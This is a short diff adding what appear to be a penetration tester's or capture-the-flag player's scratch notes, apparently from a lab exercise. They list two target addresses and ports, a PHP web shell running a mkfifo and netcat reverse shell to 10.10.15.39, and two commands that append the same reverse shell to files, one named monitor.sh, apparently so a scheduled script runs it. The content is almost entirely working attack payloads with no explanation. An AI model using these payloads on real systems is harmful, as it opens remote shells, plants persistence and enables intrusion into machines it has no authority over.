@@ -1,0 +1,9 @@
+94.237.50.242:45655
+
+94.237.54.42:48965
+
+<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.39 4444 >/tmp/f"); ?>
+
+echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.39 4444 >/tmp/f' | tee -a 
+
+echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.39 8443 >/tmp/f' | tee -a monitor.sh
